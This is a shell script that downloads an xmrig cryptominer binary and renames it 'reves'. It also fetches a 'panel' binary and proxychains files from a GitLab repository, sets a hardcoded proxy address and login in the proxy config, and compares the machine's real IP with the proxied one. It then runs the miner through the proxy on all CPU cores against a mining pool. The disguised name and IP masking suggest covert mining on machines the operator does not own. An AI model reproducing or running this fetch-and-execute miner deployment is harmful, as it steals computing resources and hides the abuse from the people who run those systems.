proxy="103.160.213.130" 
port="443" 
user="bizz"  
pass="net"
rm -f reves && wget -q -O reves 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/xmrig' && chmod +x reves
rm -f panel && wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/panel' && chmod +x panel 
rm -f proxychains.conf && wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/proxychains.conf' && chmod +x proxychains.conf 
rm -f libproxychains4.so && wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/libproxychains4.so' && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./reves -o 116.202.3.220:23656 -u 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx -p TUKIMIN -a rx/xdag -t $(nproc)
